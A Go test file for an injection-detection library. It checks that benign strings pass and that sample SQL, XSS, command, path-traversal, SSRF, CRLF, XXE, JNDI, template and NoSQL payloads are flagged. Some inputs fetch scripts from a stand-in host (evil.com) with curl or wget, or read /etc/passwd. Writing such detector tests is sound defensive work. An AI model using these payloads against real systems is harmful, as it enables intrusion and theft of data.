package injectionutils

import (
	"strings"
	"testing"
)

func TestAnalyzeInjection_Normal(t *testing.T) {
	for _, input := range []string{
		"hello world",
		"张三",
		"2024-11-06 12:00:00",
		"user@example.com",
		"价格: 100 元; 数量: 2",
		"a+b=c",
		"/api/v1/users?page=2&size=20",
		"select the item from the list",
		"javascript:var x = 1;",
	} {
		if result := AnalyzeInjection(input); result.HasInjection() {
			t.Fatalf("false positive for '%s': %v", input, result.Types)
		}
	}
}

func TestAnalyzeInjection_SQLi(t *testing.T) {
	for _, input := range []string{
		"1' or '1'='1",
		"1 union select username, password from users",
		"admin'--",
		"1; update users set is_admin=1",
	} {
		if result := AnalyzeInjection(input); !contains(result.Types, InjectionSQL) {
			t.Fatalf("expect sqli for '%s', got %v", input, result.Types)
		}
	}
}

func TestAnalyzeInjection_XSS(t *testing.T) {
	for _, input := range []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(document.cookie)>",
		"javascript:alert(1)",
	} {
		if result := AnalyzeInjection(input); !contains(result.Types, InjectionXSS) {
			t.Fatalf("expect xss for '%s', got %v", input, result.Types)
		}
	}
}

func TestAnalyzeInjection_Command(t *testing.T) {
	for _, input := range []string{
		"127.0.0.1; cat /etc/passwd",
		"test | whoami",
		"a && curl http://evil.com/shell.sh",
		"`whoami`",
		"$(wget http://evil.com/x)",
	} {
		if result := AnalyzeInjection(input); !contains(result.Types, InjectionCommand) {
			t.Fatalf("expect cmdi for '%s', got %v", input, result.Types)
		}
	}
}

func TestAnalyzeInjection_PathTraversal(t *testing.T) {
	for _, input := range []string{
		"../../../../etc/passwd",
		"..%2f..%2f..%2fetc%2fpasswd",
		"..\\..\\windows\\win.ini",
		"%252e%252e%252fetc%252fpasswd",
	} {
		if result := AnalyzeInjection(input); !contains(result.Types, InjectionPathTravers) {
			t.Fatalf("expect path-traversal for '%s', got %v", input, result.Types)
		}
	}
}

func TestAnalyzeInjection_SSRF(t *testing.T) {
	for _, input := range []string{
		"http://169.254.169.254/latest/meta-data/",
		"file:///etc/passwd",
		"gopher://127.0.0.1:6379/_INFO",
		"http://localhost:8080/admin",
		"http://10.0.0.1:6379",
	} {
		if result := AnalyzeInjection(input); !contains(result.Types, InjectionSSRF) {
			t.Fatalf("expect ssrf for '%s', got %v", input, result.Types)
		}
	}
}

func TestAnalyzeInjection_CRLF(t *testing.T) {
	for _, input := range []string{
		"value%0d%0aSet-Cookie: admin=1",
		"a\r\nLocation: http://evil.com",
	} {
		if result := AnalyzeInjection(input); !contains(result.Types, InjectionCRLF) {
			t.Fatalf("expect crlf for '%s', got %v", input, result.Types)
		}
	}
}

func TestAnalyzeInjection_LDAPAndXPath(t *testing.T) {
	if result := AnalyzeInjection("*)(uid=*))(|(uid=*"); !contains(result.Types, InjectionLDAP) {
		t.Fatalf("expect ldap, got %v", result.Types)
	}
	if result := AnalyzeInjection("x' or '1'='1"); !contains(result.Types, InjectionXPath) && !contains(result.Types, InjectionSQL) {
		t.Fatalf("expect xpath or sqli, got %v", result.Types)
	}
	if result := AnalyzeInjection("count(//user)"); !contains(result.Types, InjectionXPath) {
		t.Fatalf("expect xpath, got %v", result.Types)
	}
}

func TestAnalyzeInjection_XXE(t *testing.T) {
	var input = `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`
	var result = AnalyzeInjection(input)
	if !contains(result.Types, InjectionXXE) {
		t.Fatalf("expect xxe, got %v", result.Types)
	}
}

func TestAnalyzeInjection_Deserialize(t *testing.T) {
	for _, input := range []string{
		"rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
		"${jndi:ldap://evil.com/a}",
		"java.lang.Runtime.getRuntime().exec('id')",
	} {
		if result := AnalyzeInjection(input); !contains(result.Types, InjectionDeserialize) && !contains(result.Types, InjectionSSTI) {
			t.Fatalf("expect deserialization, got %v for '%s'", result.Types, input)
		}
	}
}

func TestAnalyzeInjection_SSTI(t *testing.T) {
	for _, input := range []string{
		"{{7*7}}",
		"{{config}}",
		"{{ self.__class__.__mro__ }}",
		"#{7*7}",
	} {
		if result := AnalyzeInjection(input); !contains(result.Types, InjectionSSTI) {
			t.Fatalf("expect ssti for '%s', got %v", input, result.Types)
		}
	}
}

func TestAnalyzeInjection_NoSQL(t *testing.T) {
	for _, input := range []string{
		`{"username":{"$ne":null}}`,
		`{"$where":"1==1"}`,
	} {
		if result := AnalyzeInjection(input); !contains(result.Types, InjectionNoSQL) {
			t.Fatalf("expect nosql for '%s', got %v", input, result.Types)
		}
	}
}

func TestAnalyzeArgs(t *testing.T) {
	var result = AnalyzeArgs("/search?q=1%27+or+%271%27%3D%271&page=1")
	if !contains(result.Types, InjectionSQL) {
		t.Fatalf("expect sqli, got %v", result.Types)
	}

	if result = AnalyzeArgs("/search?q=hello&page=1"); result.HasInjection() {
		t.Fatalf("expect no injection, got %v", result.Types)
	}
}

func TestAnalyzeResult_String(t *testing.T) {
	var result = AnalyzeInjection("1' or '1'='1 <script>alert(1)</script>")
	var s = result.String()
	if !strings.Contains(s, InjectionSQL) {
		t.Fatalf("expect string contains sqli, got '%s'", s)
	}
}

func contains(items []string, item string) bool {
	for _, i := range items {
		if i == item {
			return true
		}
	}
	return false
}
